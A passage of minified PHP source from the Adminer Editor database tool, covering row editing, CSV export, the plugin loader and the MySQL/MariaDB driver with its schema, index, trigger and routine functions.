array(idf_escape(reset($_GET["order"])).($_GET["desc"]?" DESC":""));foreach(($gd!=""?array($v[$gd]):$v)as$u){if($gd!=""||$u["type"]=="INDEX"){$Mc=array_filter($u["descs"]);$zb=false;foreach($u["columns"]as$X){if(preg_match('~date|timestamp~',$m[$X]["type"])){$zb=true;break;}}$H=array();foreach($u["columns"]as$w=>$X)$H[]=idf_escape($X).(($Mc?$u["descs"][$w]:$zb)?" DESC":"");return$H;}}return
array();}function
selectLimitProcess(){return(isset($_GET["limit"])?intval($_GET["limit"]):50);}function
selectLengthProcess(){return"100";}function
selectEmailProcess($Z,$yc){return
false;}function
selectQueryBuild($K,$Z,$Gc,$Ce,$x,$C){return"";}function
messageQuery($F,$sg,$hc=false){return" <span class='time'>".@date("H:i:s")."</span><!--\n".str_replace("--","--><!-- ",$F)."\n".($sg?"($sg)\n":"")."-->";}function
editRowPrint($R,$m,$I,$Ug){}function
editFunctions($l){$H=array();if($l["null"]&&preg_match('~blob~',$l["type"]))$H["NULL"]=lang(7);$H[""]=($l["null"]||$l["auto_increment"]||like_bool($l)?"":"*");if(preg_match('~date|time~',$l["type"]))$H["now"]=lang(48);if(preg_match('~_(md5|sha1)$~i',$l["field"],$z))$H[]=strtolower($z[1]);return$H;}function
editInput($R,$l,$ra,$Y){if($l["type"]=="enum")return(isset($_GET["select"])?"<label><input type='radio'$ra value='-1' checked><i>".lang(8)."</i></label> ":"").enum_input("radio",$ra,$l,($Y||isset($_GET["select"])?$Y:""),($l["null"]?"":null));$B=$this->foreignKeyOptions($R,$l["field"],$Y);if($B!==null)return(is_array($B)?"<select$ra>".optionlist($B,$Y,true)."</select>":"<input value='".h($Y)."'$ra class='hidden'>"."<input value='".h($B)."' class='jsonly'>"."<div></div>".script("qsl('input').oninput = partial(whisper, '".ME."script=complete&source=".urlencode($R)."&field=".urlencode($l["field"])."&value='); qsl('div').onclick = whisperClick;",""));if(like_bool($l))return'<input type="checkbox" value="1"'.(preg_match('~^(1|t|true|y|yes|on)$~i',$Y)?' checked':'')."$ra>";$Uc="";if(preg_match('~time~',$l["type"]))$Uc=lang(49);if(preg_match('~date|timestamp~',$l["type"]))$Uc=lang(50).($Uc?" [$Uc]":"");if($Uc)return"<input value='".h($Y)."'$ra> ($Uc)";if(preg_match('~_(md5|sha1)$~i',$l["field"]))return"<input type='password' value='".h($Y)."'$ra>";return'';}function
editHint($R,$l,$Y){return(preg_match('~\s+(\[.*\])$~',($l["comment"]!=""?$l["comment"]:$l["field"]),$z)?h(" $z[1]"):'');}function
processInput($l,$Y,$q=""){if($q=="now")return"$q()";$H=$Y;if(preg_match('~date|timestamp~',$l["type"])&&preg_match('(^'.str_replace('\$1','(?P<p1>\d*)',preg_replace('~(\\\\\\$([2-6]))~','(?P<p\2>\d{1,2})',preg_quote(lang(41)))).'(.*))',$Y,$z))$H=($z["p1"]!=""?$z["p1"]:($z["p2"]!=""?($z["p2"]<70?20:19).$z["p2"]:gmdate("Y")))."-$z[p3]$z[p4]-$z[p5]$z[p6]".end($z);$H=q($H);if($Y==""&&like_bool($l))$H="'0'";elseif($Y==""&&($l["null"]||!preg_match('~char|text~',$l["type"])))$H="NULL";elseif(preg_match('~^(md5|sha1)$~',$q))$H="$q($H)";return
unconvert_field($l,$H);}function
dumpOutput(){return
array();}function
dumpFormat(){return
array('csv'=>'CSV,','csv;'=>'CSV;','tsv'=>'TSV');}function
dumpDatabase($i){}function
dumpTable($R,$dg,$wd=0){echo"\xef\xbb\xbf";}function
dumpData($R,$dg,$F){$G=connection()->query($F,1);if($G){while($I=$G->fetch_assoc()){if($dg=="table"){dump_csv(array_keys($I));$dg="INSERT";}dump_csv($I);}}}function
dumpFilename($ad){return
friendly_url($ad);}function
dumpHeaders($ad,$ge=false){$dc="csv";header("Content-Type: text/csv; charset=utf-8");return$dc;}function
dumpFooter(){}function
importServerPath(){}function
homepage(){return
true;}function
navigation($de){echo"<h1>".adminer()->name()." <span class='version'>".VERSION;$le=$_COOKIE["adminer_version"];echo" <a href='https://www.adminer.org/editor/#download'".target_blank()." id='version'>".(version_compare(VERSION,$le)<0?h($le):"")."</a>","</span></h1>\n";switch_lang();if($de=="auth"){$pc=true;foreach((array)$_SESSION["pwds"]as$ch=>$Of){foreach($Of[""]as$V=>$D){if($D!==null){if($pc){echo"<ul id='logins'>",script("mixin(qs('#logins'), {onmouseover: menuOver, onmouseout: menuOut});");$pc=false;}echo"<li><a href='".h(auth_url($ch,"",$V))."'>".($V!=""?h($V):"<i>".lang(7)."</i>")."</a>\n";}}}}else{adminer()->databasesPrint($de);if($de!="db"&&$de!="ns"){$S=table_status('',true);if(!$S)echo"<p class='message'>".lang(9)."\n";else
adminer()->tablesPrint($S);}}}function
syntaxHighlighting($T){}function
databasesPrint($de){}function
tablesPrint($T){echo"<ul id='tables'>",script("mixin(qs('#tables'), {onmouseover: menuOver, onmouseout: menuOut});");foreach($T
as$I){echo'<li>';$_=adminer()->tableName($I);if($_!="")echo"<a href='".h(ME).'select='.urlencode($I["Name"])."'".bold($_GET["select"]==$I["Name"]||$_GET["edit"]==$I["Name"],"select")." title='".lang(51)."'>$_</a>\n";}echo"</ul>\n";}function
_foreignColumn($yc,$d){foreach((array)$yc[$d]as$xc){if(count($xc["source"])==1){$_=adminer()->rowDescription($xc["table"]);if($_!=""){$s=idf_escape($xc["target"][0]);return
array($xc["table"],$s,$_);}}}}private
function
foreignKeyOptions($R,$d,$Y=null){if(list($mg,$s,$_)=$this->_foreignColumn(column_foreign_keys($R),$d)){$H=&$this->values[$mg];if($H===null){$S=table_status1($mg);$H=($S["Rows"]>1000?"":array(""=>"")+get_key_vals("SELECT $s, $_ FROM ".table($mg)." ORDER BY 2"));}if(!$H&&$Y!==null)return
get_val("SELECT $_ FROM ".table($mg)." WHERE $s = ".q($Y));return$H;}}}class
Plugins{private
static$append=array('dumpFormat'=>true,'dumpOutput'=>true,'editRowPrint'=>true,'editFunctions'=>true,'config'=>true);var$plugins;var$error='';private$hooks=array();function
__construct($Ze){if($Ze===null){$Ze=array();$Aa="adminer-plugins";if(is_dir($Aa)){foreach(glob("$Aa/*.php")as$n)$ed=include_once"./$n";}$Tc=" href='https://www.adminer.org/plugins/#use'".target_blank();if(file_exists("$Aa.php")){$ed=include_once"./$Aa.php";if(is_array($ed)){foreach($ed
as$Ye)$Ze[get_class($Ye)]=$Ye;}else$this->error
.=lang(52,"<b>$Aa.php</b>",$Tc)."<br>";}foreach(get_declared_classes()as$Ra){if(!$Ze[$Ra]&&preg_match('~^Adminer\w~i',$Ra)){$sf=new
\ReflectionClass($Ra);$hb=$sf->getConstructor();if($hb&&$hb->getNumberOfRequiredParameters())$this->error
.=lang(53,$Tc,"<b>$Ra</b>","<b>$Aa.php</b>")."<br>";else$Ze[$Ra]=new$Ra;}}}$this->plugins=$Ze;$ga=new
Adminer;$Ze[]=$ga;$sf=new
\ReflectionObject($ga);foreach($sf->getMethods()as$ce){foreach($Ze
as$Ye){$_=$ce->getName();if(method_exists($Ye,$_))$this->hooks[$_][]=$Ye;}}}function
__call($_,array$Oe){$ma=array();foreach($Oe
as$w=>$X)$ma[]=&$Oe[$w];$H=null;foreach($this->hooks[$_]as$Ye){$Y=call_user_func_array(array($Ye,$_),$ma);if($Y!==null){if(!self::$append[$_])return$Y;$H=$Y+(array)$H;}}return$H;}}abstract
class
Plugin{protected$translations=array();function
description(){return$this->lang('');}function
screenshot(){return"";}protected
function
lang($t,$A=null){$ma=func_get_args();$ma[0]=idx($this->translations[LANG],$t)?:$t;return
call_user_func_array('Adminer\lang_format',$ma);}}Adminer::$instance=(function_exists('adminer_object')?adminer_object():(is_dir("adminer-plugins")||file_exists("adminer-plugins.php")?new
Plugins(null):new
Adminer));SqlDriver::$drivers=array("server"=>"MySQL / MariaDB")+SqlDriver::$drivers;if(!defined('Adminer\DRIVER')){define('Adminer\DRIVER',"server");if(extension_loaded("mysqli")&&$_GET["ext"]!="pdo"){class
Db
extends
\MySQLi{static$instance;var$extension="MySQLi",$flavor='';function
__construct(){parent::init();}function
attach($M,$V,$D){mysqli_report(MYSQLI_REPORT_OFF);list($Wc,$af)=explode(":",$M,2);$O=adminer()->connectSsl();if($O)$this->ssl_set($O['key'],$O['cert'],$O['ca'],'','');$H=@$this->real_connect(($M!=""?$Wc:ini_get("mysqli.default_host")),($M.$V!=""?$V:ini_get("mysqli.default_user")),($M.$V.$D!=""?$D:ini_get("mysqli.default_pw")),null,(is_numeric($af)?intval($af):ini_get("mysqli.default_port")),(is_numeric($af)?null:$af),($O?($O['verify']!==false?2048:64):0));$this->options(MYSQLI_OPT_LOCAL_INFILE,false);return($H?'':$this->error);}function
set_charset($La){if(parent::set_charset($La))return
true;parent::set_charset('utf8');return$this->query("SET NAMES $La");}function
next_result(){return
self::more_results()&&parent::next_result();}function
quote($Q){return"'".$this->escape_string($Q)."'";}}}elseif(extension_loaded("mysql")&&!((ini_bool("sql.safe_mode")||ini_bool("mysql.allow_local_infile"))&&extension_loaded("pdo_mysql"))){class
Db
extends
SqlDb{private$link;function
attach($M,$V,$D){if(ini_bool("mysql.allow_local_infile"))return
lang(54,"'mysql.allow_local_infile'","MySQLi","PDO_MySQL");$this->link=@mysql_connect(($M!=""?$M:ini_get("mysql.default_host")),("$M$V"!=""?$V:ini_get("mysql.default_user")),("$M$V$D"!=""?$D:ini_get("mysql.default_password")),true,131072);if(!$this->link)return
mysql_error();$this->server_info=mysql_get_server_info($this->link);return'';}function
set_charset($La){if(function_exists('mysql_set_charset')){if(mysql_set_charset($La,$this->link))return
true;mysql_set_charset('utf8',$this->link);}return$this->query("SET NAMES $La");}function
quote($Q){return"'".mysql_real_escape_string($Q,$this->link)."'";}function
select_db($tb){return
mysql_select_db($tb,$this->link);}function
query($F,$Mg=false){$G=@($Mg?mysql_unbuffered_query($F,$this->link):mysql_query($F,$this->link));$this->error="";if(!$G){$this->errno=mysql_errno($this->link);$this->error=mysql_error($this->link);return
false;}if($G===true){$this->affected_rows=mysql_affected_rows($this->link);$this->info=mysql_info($this->link);return
true;}return
new
Result($G);}}class
Result{var$num_rows;private$result;private$offset=0;function
__construct($G){$this->result=$G;$this->num_rows=mysql_num_rows($G);}function
fetch_assoc(){return
mysql_fetch_assoc($this->result);}function
fetch_row(){return
mysql_fetch_row($this->result);}function
fetch_field(){$H=mysql_fetch_field($this->result,$this->offset++);$H->orgtable=$H->table;$H->charsetnr=($H->blob?63:0);return$H;}function
__destruct(){mysql_free_result($this->result);}}}elseif(extension_loaded("pdo_mysql")){class
Db
extends
PdoDb{var$extension="PDO_MySQL";function
attach($M,$V,$D){$B=array(\PDO::MYSQL_ATTR_LOCAL_INFILE=>false);$O=adminer()->connectSsl();if($O){if($O['key'])$B[\PDO::MYSQL_ATTR_SSL_KEY]=$O['key'];if($O['cert'])$B[\PDO::MYSQL_ATTR_SSL_CERT]=$O['cert'];if($O['ca'])$B[\PDO::MYSQL_ATTR_SSL_CA]=$O['ca'];if(isset($O['verify']))$B[\PDO::MYSQL_ATTR_SSL_VERIFY_SERVER_CERT]=$O['verify'];}return$this->dsn("mysql:charset=utf8;host=".str_replace(":",";unix_socket=",preg_replace('~:(\d)~',';port=\1',$M)),$V,$D,$B);}function
set_charset($La){return$this->query("SET NAMES $La");}function
select_db($tb){return$this->query("USE ".idf_escape($tb));}function
query($F,$Mg=false){$this->pdo->setAttribute(\PDO::MYSQL_ATTR_USE_BUFFERED_QUERY,!$Mg);return
parent::query($F,$Mg);}}}class
Driver
extends
SqlDriver{static$extensions=array("MySQLi","MySQL","PDO_MySQL");static$jush="sql";var$unsigned=array("unsigned","zerofill","unsigned zerofill");var$operators=array("=","<",">","<=",">=","!=","LIKE","LIKE %%","REGEXP","IN","FIND_IN_SET","IS NULL","NOT LIKE","NOT REGEXP","NOT IN","IS NOT NULL","SQL");var$functions=array("char_length","date","from_unixtime","lower","round","floor","ceil","sec_to_time","time_to_sec","upper");var$grouping=array("avg","count","count distinct","group_concat","max","min","sum");static
function
connect($M,$V,$D){$g=parent::connect($M,$V,$D);if(is_string($g)){if(function_exists('iconv')&&!is_utf8($g)&&strlen($Bf=iconv("windows-1250","utf-8",$g))>strlen($g))$g=$Bf;return$g;}$g->set_charset(charset($g));$g->query("SET sql_quote_show_create = 1, autocommit = 1");$g->flavor=(preg_match('~MariaDB~',$g->server_info)?'maria':'mysql');add_driver(DRIVER,($g->flavor=='maria'?"MariaDB":"MySQL"));return$g;}function
__construct(Db$g){parent::__construct($g);$this->types=array(lang(25)=>array("tinyint"=>3,"smallint"=>5,"mediumint"=>8,"int"=>10,"bigint"=>20,"decimal"=>66,"float"=>12,"double"=>21),lang(26)=>array("date"=>10,"datetime"=>19,"timestamp"=>19,"time"=>10,"year"=>4),lang(27)=>array("char"=>255,"varchar"=>65535,"tinytext"=>255,"text"=>65535,"mediumtext"=>16777215,"longtext"=>4294967295),lang(55)=>array("enum"=>65535,"set"=>64),lang(28)=>array("bit"=>20,"binary"=>255,"varbinary"=>65535,"tinyblob"=>255,"blob"=>65535,"mediumblob"=>16777215,"longblob"=>4294967295),lang(30)=>array("geometry"=>0,"point"=>0,"linestring"=>0,"polygon"=>0,"multipoint"=>0,"multilinestring"=>0,"multipolygon"=>0,"geometrycollection"=>0),);$this->insertFunctions=array("char"=>"md5/sha1/password/encrypt/uuid","binary"=>"md5/sha1","date|time"=>"now",);$this->editFunctions=array(number_type()=>"+/-","date"=>"+ interval/- interval","time"=>"addtime/subtime","char|text"=>"concat",);if(min_version('5.7.8',10.2,$g))$this->types[lang(27)]["json"]=4294967295;if(min_version('',10.7,$g)){$this->types[lang(27)]["uuid"]=128;$this->insertFunctions['uuid']='uuid';}if(min_version(9,'',$g)){$this->types[lang(25)]["vector"]=16383;$this->insertFunctions['vector']='string_to_vector';}if(min_version(5.1,'',$g))$this->partitionBy=array("HASH","LINEAR HASH","KEY","LINEAR KEY","RANGE","LIST");if(min_version(5.7,10.2,$g))$this->generated=array("STORED","VIRTUAL");}function
unconvertFunction(array$l){return(preg_match("~binary~",$l["type"])?"<code class='jush-sql'>UNHEX</code>":($l["type"]=="bit"?doc_link(array('sql'=>'bit-value-literals.html'),"<code>b''</code>"):(preg_match("~geometry|point|linestring|polygon~",$l["type"])?"<code class='jush-sql'>GeomFromText</code>":"")));}function
insert($R,array$N){return($N?parent::insert($R,$N):queries("INSERT INTO ".table($R)." ()\nVALUES ()"));}function
insertUpdate($R,array$J,array$E){$e=array_keys(reset($J));$ef="INSERT INTO ".table($R)." (".implode(", ",$e).") VALUES\n";$bh=array();foreach($e
as$w)$bh[$w]="$w = VALUES($w)";$fg="\nON DUPLICATE KEY UPDATE ".implode(", ",$bh);$bh=array();$Id=0;foreach($J
as$N){$Y="(".implode(", ",$N).")";if($bh&&(strlen($ef)+$Id+strlen($Y)+strlen($fg)>1e6)){if(!queries($ef.implode(",\n",$bh).$fg))return
false;$bh=array();$Id=0;}$bh[]=$Y;$Id+=strlen($Y)+2;}return
queries($ef.implode(",\n",$bh).$fg);}function
slowQuery($F,$tg){if(min_version('5.7.8','10.1.2')){if($this->conn->flavor=='maria')return"SET STATEMENT max_statement_time=$tg FOR $F";elseif(preg_match('~^(SELECT\b)(.+)~is',$F,$z))return"$z[1] /*+ MAX_EXECUTION_TIME(".($tg*1000).") */ $z[2]";}}function
convertSearch($t,array$X,array$l){return(preg_match('~char|text|enum|set~',$l["type"])&&!preg_match("~^utf8~",$l["collation"])&&preg_match('~[\x80-\xFF]~',$X['val'])?"CONVERT($t USING ".charset($this->conn).")":$t);}function
warnings(){$G=$this->conn->query("SHOW WARNINGS");if($G&&$G->num_rows){ob_start();print_select_result($G);return
ob_get_clean();}}function
tableHelp($_,$wd=false){$Pd=($this->conn->flavor=='maria');if(information_schema(DB))return
strtolower("information-schema-".($Pd?"$_-table/":str_replace("_","-",$_)."-table.html"));if(DB=="mysql")return($Pd?"mysql$_-table/":"system-schema.html");}function
partitionsInfo($R){$Bc="FROM information_schema.PARTITIONS WHERE TABLE_SCHEMA = ".q(DB)." AND TABLE_NAME = ".q($R);$G=connection()->query("SELECT PARTITION_METHOD, PARTITION_EXPRESSION, PARTITION_ORDINAL_POSITION $Bc ORDER BY PARTITION_ORDINAL_POSITION DESC LIMIT 1");$H=array();list($H["partition_by"],$H["partition"],$H["partitions"])=$G->fetch_row();$Te=get_key_vals("SELECT PARTITION_NAME, PARTITION_DESCRIPTION $Bc AND PARTITION_NAME != '' ORDER BY PARTITION_ORDINAL_POSITION");$H["partition_names"]=array_keys($Te);$H["partition_values"]=array_values($Te);return$H;}function
hasCStyleEscapes(){static$Ja;if($Ja===null){$Zf=get_val("SHOW VARIABLES LIKE 'sql_mode'",1,$this->conn);$Ja=(strpos($Zf,'NO_BACKSLASH_ESCAPES')===false);}return$Ja;}function
engines(){$H=array();foreach(get_rows("SHOW ENGINES")as$I){if(preg_match("~YES|DEFAULT~",$I["Support"]))$H[]=$I["Engine"];}return$H;}function
indexAlgorithms(array$ig){return(preg_match('~^(MEMORY|NDB)$~',$ig["Engine"])?array("HASH","BTREE"):array());}}function
idf_escape($t){return"`".str_replace("`","``",$t)."`";}function
table($t){return
idf_escape($t);}function
get_databases($uc){$H=get_session("dbs");if($H===null){$F="SELECT SCHEMA_NAME FROM information_schema.SCHEMATA ORDER BY SCHEMA_NAME";$H=($uc?slow_query($F):get_vals($F));restart_session();set_session("dbs",$H);stop_session();}return$H;}function
limit($F,$Z,$x,$re=0,$L=" "){return" $F$Z".($x?$L."LIMIT $x".($re?" OFFSET $re":""):"");}function
limit1($R,$F,$Z,$L="\n"){return
limit($F,$Z,1,0,$L);}function
db_collation($i,array$Wa){$H=null;$lb=get_val("SHOW CREATE DATABASE ".idf_escape($i),1);if(preg_match('~ COLLATE ([^ ]+)~',$lb,$z))$H=$z[1];elseif(preg_match('~ CHARACTER SET ([^ ]+)~',$lb,$z))$H=$Wa[$z[1]][-1];return$H;}function
logged_user(){return
get_val("SELECT USER()");}function
tables_list(){return
get_key_vals("SELECT TABLE_NAME, TABLE_TYPE FROM information_schema.TABLES WHERE TABLE_SCHEMA = DATABASE() ORDER BY TABLE_NAME");}function
count_tables(array$ub){$H=array();foreach($ub
as$i)$H[$i]=count(get_vals("SHOW TABLES IN ".idf_escape($i)));return$H;}function
table_status($_="",$ic=false){$H=array();foreach(get_rows($ic?"SELECT TABLE_NAME AS Name, ENGINE AS Engine, TABLE_COMMENT AS Comment FROM information_schema.TABLES WHERE TABLE_SCHEMA = DATABASE() ".($_!=""?"AND TABLE_NAME = ".q($_):"ORDER BY Name"):"SHOW TABLE STATUS".($_!=""?" LIKE ".q(addcslashes($_,"%_\\")):""))as$I){if($I["Engine"]=="InnoDB")$I["Comment"]=preg_replace('~(?:(.+); )?InnoDB free: .*~','\1',$I["Comment"]);if(!isset($I["Engine"]))$I["Comment"]="";if($_!="")$I["Name"]=$_;$H[$I["Name"]]=$I;}return$H;}function
is_view(array$S){return$S["Engine"]===null;}function
fk_support(array$S){return
preg_match('~InnoDB|IBMDB2I'.(min_version(5.6)?'|NDB':'').'~i',$S["Engine"]);}function
fields($R){$Pd=(connection()->flavor=='maria');$H=array();foreach(get_rows("SELECT * FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = DATABASE() AND TABLE_NAME = ".q($R)." ORDER BY ORDINAL_POSITION")as$I){$l=$I["COLUMN_NAME"];$U=$I["COLUMN_TYPE"];$Fc=$I["GENERATION_EXPRESSION"];$gc=$I["EXTRA"];preg_match('~^(VIRTUAL|PERSISTENT|STORED)~',$gc,$Ec);preg_match('~^([^( ]+)(?:\((.+)\))?( unsigned)?( zerofill)?$~',$U,$Sd);$j=$I["COLUMN_DEFAULT"];if($j!=""){$vd=preg_match('~text|json~',$Sd[1]);if(!$Pd&&$vd)$j=preg_replace("~^(_\w+)?('.*')$~",'\2',stripslashes($j));if($Pd||$vd){$j=($j=="NULL"?null:preg_replace_callback("~^'(.*)'$~",function($z){return
stripslashes(str_replace("''","'",$z[1]));},$j));}if(!$Pd&&preg_match('~binary~',$Sd[1])&&preg_match('~^0x(\w*)$~',$j,$z))$j=pack("H*",$z[1]);}$H[$l]=array("field"=>$l,"full_type"=>$U,"type"=>$Sd[1],"length"=>$Sd[2],"unsigned"=>ltrim($Sd[3].$Sd[4]),"default"=>($Ec?($Pd?$Fc:stripslashes($Fc)):$j),"null"=>($I["IS_NULLABLE"]=="YES"),"auto_increment"=>($gc=="auto_increment"),"on_update"=>(preg_match('~\bon update (\w+)~i',$gc,$z)?$z[1]:""),"collation"=>$I["COLLATION_NAME"],"privileges"=>array_flip(explode(",","$I[PRIVILEGES],where,order")),"comment"=>$I["COLUMN_COMMENT"],"primary"=>($I["COLUMN_KEY"]=="PRI"),"generated"=>($Ec[1]=="PERSISTENT"?"STORED":$Ec[1]),);}return$H;}function
indexes($R,$h=null){$H=array();foreach(get_rows("SHOW INDEX FROM ".table($R),$h)as$I){$_=$I["Key_name"];$H[$_]["type"]=($_=="PRIMARY"?"PRIMARY":($I["Index_type"]=="FULLTEXT"?"FULLTEXT":($I["Non_unique"]?($I["Index_type"]=="SPATIAL"?"SPATIAL":"INDEX"):"UNIQUE")));$H[$_]["columns"][]=$I["Column_name"];$H[$_]["lengths"][]=($I["Index_type"]=="SPATIAL"?null:$I["Sub_part"]);$H[$_]["descs"][]=null;$H[$_]["algorithm"]=$I["Index_type"];}return$H;}function
foreign_keys($R){static$Ve='(?:`(?:[^`]|``)+`|"(?:[^"]|"")+")';$H=array();$mb=get_val("SHOW CREATE TABLE ".table($R),1);if($mb){preg_match_all("~CONSTRAINT ($Ve) FOREIGN KEY ?\\(((?:$Ve,? ?)+)\\) REFERENCES ($Ve)(?:\\.($Ve))? \\(((?:$Ve,? ?)+)\\)(?: ON DELETE (".driver()->onActions."))?(?: ON UPDATE (".driver()->onActions."))?~",$mb,$Td,PREG_SET_ORDER);foreach($Td
as$z){preg_match_all("~$Ve~",$z[2],$Vf);preg_match_all("~$Ve~",$z[5],$mg);$H[idf_unescape($z[1])]=array("db"=>idf_unescape($z[4]!=""?$z[3]:$z[4]),"table"=>idf_unescape($z[4]!=""?$z[4]:$z[3]),"source"=>array_map('Adminer\idf_unescape',$Vf[0]),"target"=>array_map('Adminer\idf_unescape',$mg[0]),"on_delete"=>($z[6]?:"RESTRICT"),"on_update"=>($z[7]?:"RESTRICT"),);}}return$H;}function
view($_){return
array("select"=>preg_replace('~^(?:[^`]|`[^`]*`)*\s+AS\s+~isU','',get_val("SHOW CREATE VIEW ".table($_),1)));}function
collations(){$H=array();foreach(get_rows("SHOW COLLATION")as$I){if($I["Default"])$H[$I["Charset"]][-1]=$I["Collation"];else$H[$I["Charset"]][]=$I["Collation"];}ksort($H);foreach($H
as$w=>$X)sort($H[$w]);return$H;}function
information_schema($i){return($i=="information_schema")||(min_version(5.5)&&$i=="performance_schema");}function
error(){return
h(preg_replace('~^You have an error.*syntax to use~U',"Syntax error",connection()->error));}function
create_database($i,$c){return
queries("CREATE DATABASE ".idf_escape($i).($c?" COLLATE ".q($c):""));}function
drop_databases(array$ub){$H=apply_queries("DROP DATABASE",$ub,'Adminer\idf_escape');restart_session();set_session("dbs",null);return$H;}function
rename_database($_,$c){$H=false;if(create_database($_,$c)){$T=array();$fh=array();foreach(tables_list()as$R=>$U){if($U=='VIEW')$fh[]=$R;else$T[]=$R;}$H=(!$T&&!$fh)||move_tables($T,$fh,$_);drop_databases($H?array(DB):array());}return$H;}function
auto_increment(){$ua=" PRIMARY KEY";if($_GET["create"]!=""&&$_POST["auto_increment_col"]){foreach(indexes($_GET["create"])as$u){if(in_array($_POST["fields"][$_POST["auto_increment_col"]]["orig"],$u["columns"],true)){$ua="";break;}if($u["type"]=="PRIMARY")$ua=" UNIQUE";}}return" AUTO_INCREMENT$ua";}function
alter_table($R,$_,array$m,array$wc,$ab,$Sb,$c,$ta,$Se){$b=array();foreach($m
as$l){if($l[1]){$j=$l[1][3];if(preg_match('~ GENERATED~',$j)){$l[1][3]=(connection()->flavor=='maria'?"":$l[1][2]);$l[1][2]=$j;}$b[]=($R!=""?($l[0]!=""?"CHANGE ".idf_escape($l[0]):"ADD"):" ")." ".implode($l[1]).($R!=""?$l[2]:"");}else$b[]="DROP ".idf_escape($l[0]);}$b=array_merge($b,$wc);$P=($ab!==null?" COMMENT=".q($ab):"").($Sb?" ENGINE=".q($Sb):"").($c?" COLLATE ".q($c):"").($ta!=""?" AUTO_INCREMENT=$ta":"");if($Se){$Te=array();if($Se["partition_by"]=='RANGE'||$Se["partition_by"]=='LIST'){foreach($Se["partition_names"]as$w=>$X){$Y=$Se["partition_values"][$w];$Te[]="\n  PARTITION ".idf_escape($X)." VALUES ".($Se["partition_by"]=='RANGE'?"LESS THAN":"IN").($Y!=""?" ($Y)":" MAXVALUE");}}$P
.="\nPARTITION BY $Se[partition_by]($Se[partition])";if($Te)$P
.=" (".implode(",",$Te)."\n)";elseif($Se["partitions"])$P
.=" PARTITIONS ".(+$Se["partitions"]);}elseif($Se===null)$P
.="\nREMOVE PARTITIONING";if($R=="")return
queries("CREATE TABLE ".table($_)." (\n".implode(",\n",$b)."\n)$P");if($R!=$_)$b[]="RENAME TO ".table($_);if($P)$b[]=ltrim($P);return($b?queries("ALTER TABLE ".table($R)."\n".implode(",\n",$b)):true);}function
alter_indexes($R,$b){$Ka=array();foreach($b
as$X)$Ka[]=($X[2]=="DROP"?"\nDROP INDEX ".idf_escape($X[1]):"\nADD $X[0] ".($X[0]=="PRIMARY"?"KEY ":"").($X[1]!=""?idf_escape($X[1])." ":"")."(".implode(", ",$X[2]).")");return
queries("ALTER TABLE ".table($R).implode(",",$Ka));}function
truncate_tables(array$T){return
apply_queries("TRUNCATE TABLE",$T);}function
drop_views(array$fh){return
queries("DROP VIEW ".implode(", ",array_map('Adminer\table',$fh)));}function
drop_tables(array$T){return
queries("DROP TABLE ".implode(", ",array_map('Adminer\table',$T)));}function
move_tables(array$T,array$fh,$mg){$vf=array();foreach($T
as$R)$vf[]=table($R)." TO ".idf_escape($mg).".".table($R);if(!$vf||queries("RENAME TABLE ".implode(", ",$vf))){$xb=array();foreach($fh
as$R)$xb[table($R)]=view($R);connection()->select_db($mg);$i=idf_escape(DB);foreach($xb
as$_=>$eh){if(!queries("CREATE VIEW $_ AS ".str_replace(" $i."," ",$eh["select"]))||!queries("DROP VIEW $i.$_"))return
false;}return
true;}return
false;}function
copy_tables(array$T,array$fh,$mg){queries("SET sql_mode = 'NO_AUTO_VALUE_ON_ZERO'");foreach($T
as$R){$_=($mg==DB?table("copy_$R"):idf_escape($mg).".".table($R));if(($_POST["overwrite"]&&!queries("\nDROP TABLE IF EXISTS $_"))||!queries("CREATE TABLE $_ LIKE ".table($R))||!queries("INSERT INTO $_ SELECT * FROM ".table($R)))return
false;foreach(get_rows("SHOW TRIGGERS LIKE ".q(addcslashes($R,"%_\\")))as$I){$Gg=$I["Trigger"];if(!queries("CREATE TRIGGER ".($mg==DB?idf_escape("copy_$Gg"):idf_escape($mg).".".idf_escape($Gg))." $I[Timing] $I[Event] ON $_ FOR EACH ROW\n$I[Statement];"))return
false;}}foreach($fh
as$R){$_=($mg==DB?table("copy_$R"):idf_escape($mg).".".table($R));$eh=view($R);if(($_POST["overwrite"]&&!queries("DROP VIEW IF EXISTS $_"))||!queries("CREATE VIEW $_ AS $eh[select]"))return
false;}return
true;}function
trigger($_,$R){if($_=="")return
array();$J=get_rows("SHOW TRIGGERS WHERE `Trigger` = ".q($_));return
reset($J);}function
triggers($R){$H=array();foreach(get_rows("SHOW TRIGGERS LIKE ".q(addcslashes($R,"%_\\")))as$I)$H[$I["Trigger"]]=array($I["Timing"],$I["Event"]);return$H;}function
trigger_options(){return
array("Timing"=>array("BEFORE","AFTER"),"Event"=>array("INSERT","UPDATE","DELETE"),"Type"=>array("FOR EACH ROW"),);}function
routine($_,$U){$ka=array("bool","boolean","integer","double precision","real","dec","numeric","fixed","national char","national varchar");$Wf="(?:\\s|/\\*[\s\S]*?\\*/|(?:#|-- )[^\n]*\n?|--\r?\n)";$Tb=driver()->enumLength;$Kg="((".implode("|",array_merge(array_keys(driver()->types()),$ka)).")\\b(?:\\s*\\(((?:[^'\")]|$Tb)++)\\))?"."\\s*(zerofill\\s*)?(unsigned(?:\\s+zerofill)?)?)(?:\\s*(?:CHARSET|CHARACTER\\s+SET)\\s*['\"]?([^'\"\\s,]+)['\"]?)?";$Ve="$Wf*(".($U=="FUNCTION"?"":driver()->inout).")?\\s*(?:`((?:[^`]|``)*)`\\s*|\\b(\\S+)\\s+)$Kg";$lb=get_val("SHOW CREATE $U ".idf_escape($_),2);preg_match("~\\(((?:$Ve\\s*,?)*)\\)\\s*".($U=="FUNCTION"?"RETURNS\\s+$Kg\\s+":"")."(.*)~is",$lb,$z);$m=array();preg_match_all("~$Ve\\s*,?~is",$z[1],$Td,PREG_SET_ORDER);foreach($Td
as$Ne)$m[]=array("field"=>str_replace("``","`",$Ne[2]).$Ne[3],"type"=>strtolower($Ne[5]),"length"=>preg_replace_callback("~$Tb~s",'Adminer\normalize_enum',$Ne[6]),"unsigned"=>strtolower(preg_replace('~\s+~',' ',trim("$Ne[8] $Ne[7]"))),"null"=>true,"full_type"=>$Ne[4],"inout"=>strtoupper($Ne[1]),"collation"=>strtolower($Ne[9]),);return
